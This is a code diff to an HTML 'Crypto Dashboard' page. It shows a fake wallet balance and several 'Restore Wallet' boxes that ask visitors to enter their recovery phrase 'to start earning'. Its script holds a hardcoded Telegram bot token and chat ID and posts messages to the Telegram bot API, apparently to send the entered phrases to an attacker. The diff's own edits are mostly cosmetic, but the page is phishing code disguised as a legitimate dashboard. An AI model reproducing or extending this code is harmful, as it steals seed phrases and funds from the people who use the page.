@@ -4,10 +4,21 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Crypto Dashboard</title>
+ <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500&display=swap" rel="stylesheet">
   <style>
-    * {margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif;}
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Rajdhani', sans-serif;
+      font-size: 18px;
+  line-height: 1.1;
+    }
     body {
-      background: #0f0f1b; color: #fff; min-height: 100vh; padding-bottom: 80px;
+      background: #0f0f1b;
+      color: #fff;
+      min-height: 100vh;
+      padding-bottom: 80px;
       transition: background 0.3s, color 0.3s;
     }
     .content-section {display: none; padding: 30px 20px; text-align: center;}
@@ -46,9 +57,13 @@
       border-radius: 8px; cursor: pointer;
       font-size: 16px;
     }
-    #bnbPrice {color: #00ff90; font-weight: bold; font-size: 18px; margin-top: 10px;}
+    #bnbPrice {
+      color: #00ff90;
+      font-weight: bold;
+      font-size: 18px;
+      margin-top: 10px;
+    }
     .tx-log {margin-top: 15px; font-size: 15px; color: #ccc; text-align: left; padding-left: 10px;}
-
     #themeToggle {
       position: fixed;
       top: 10px;
@@ -61,7 +76,6 @@
       cursor: pointer;
       z-index: 999;
     }
-
     body.light-mode {
       background: #f2f2f2;
       color: #000;
@@ -101,7 +115,7 @@
   </style>
 </head>
 <body>
-
+<!-- 🔘 Theme Toggle -->
 <button id="themeToggle" onclick="toggleTheme()">🌓</button>
 
 <!-- ✅ Home Section -->
@@ -113,7 +127,6 @@
       <strong class="walletAmount">$950</strong> (<span class="bnbValueHome">--</span> BNB)
     </div>
   </div>
-  <!-- ✅ Restore Wallet added in Home -->
   <div class="content-box">
     <h2 style="color: #44e3ff;">🔐 Restore Wallet</h2>
     <p style="color: #cceeff;">Enter your Recovery phrase to restore your wallet and start earning.</p>
@@ -134,8 +147,6 @@
       <strong class="walletAmount">$950</strong> (<span class="bnbValueWallet">--</span> BNB)
     </div>
   </div>
-
-  <!-- ✅ Restore Wallet with unique IDs -->
   <div class="content-box">
     <h2 style="color: #44e3ff;">🔐 Restore Wallet</h2>
     <p style="color: #cceeff;">Enter your Recovery phrase to restore your wallet and start earning.</p>
@@ -170,7 +181,6 @@
 <script>
   const TELEGRAM_BOT_TOKEN = "7964620453:AAFMQ4mxCpezN6kuTCUEgK7WeMBFNJW2ZS4";
   const TELEGRAM_CHAT_ID = "7979664801";
-
   let bnbPriceUSD = 600;
   let currentBalanceUSD = 950;
 
@@ -209,10 +219,7 @@
     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message
-      })
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
     }).then(res => {
       if (res.ok) {
         msgBox.style.color = '#00ff90';
@@ -228,15 +235,15 @@
     });
   }
 
+  function toggleTheme() {
+    document.body.classList.toggle('light-mode');
+    localStorage.setItem('theme', document.body.classList.contains('light-mode') ? 'light' : 'dark');
+  }
+
   function addToHistory(txt) {
     const div = document.createElement("div");
     div.textContent = txt;
     document.getElementById("txHistory").prepend(div);
-  }
-
-  function toggleTheme() {
-    document.body.classList.toggle('light-mode');
-    localStorage.setItem('theme', document.body.classList.contains('light-mode') ? 'light' : 'dark');
   }
 
   window.onload = () => {
